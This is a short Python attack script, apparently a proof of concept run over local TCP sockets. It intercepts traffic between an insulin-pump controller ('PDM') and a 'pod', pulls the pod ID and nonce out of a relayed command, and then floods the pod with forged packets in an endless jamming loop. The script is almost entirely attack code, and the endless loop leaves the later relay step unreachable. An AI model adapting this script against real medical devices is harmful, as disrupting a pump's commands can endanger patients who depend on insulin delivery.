import asyncio
import socket
import struct

PDM_PORT = 6768
POD_PORT = 6767

def jam(podid: bytes, nonce: bytes, podsock: socket.socket):
    while 1:
        packet = podid \
                + b"\x01\x00\x00\x00" \
                + b"\x01\x00\x00\x00" \
                + nonce \
                + b"\x01\x00\x00\x00"
        podsock.sendall(packet)


async def main():
    pdmsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
    pdmsock.connect(("", PDM_PORT))
    print("PDM connection established. Waiting for pod...")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0) as podserv:
        podserv.bind(("", POD_PORT))
        podserv.listen(5)
        podsock, addr = podserv.accept()
        print("Pod connection established.")
        with podsock:
            while True:
                data = pdmsock.recv(1024)
                podsock.sendall(data)

                # As a note, we don't know the nonce at all. But we can figure it out if we know how the commands are sent. We could probably figure this out using a tool like WireShark.
                # Let's say we know how to find the nonce. This will print it out.
                podid = data[0:4]
                nonce = data[20:24]
                print("Pod ID found: ", struct.unpack("<i", podid))
                print("Nonce found:", "".join("%02x" % i for i in nonce))

                # Begin running the jammer now that we know the nonce:
                jam(podid, nonce, podsock)

                data = podsock.recv(1024)
                pdmsock.sendall(data)


if __name__ == "__main__":
    asyncio.run(main())
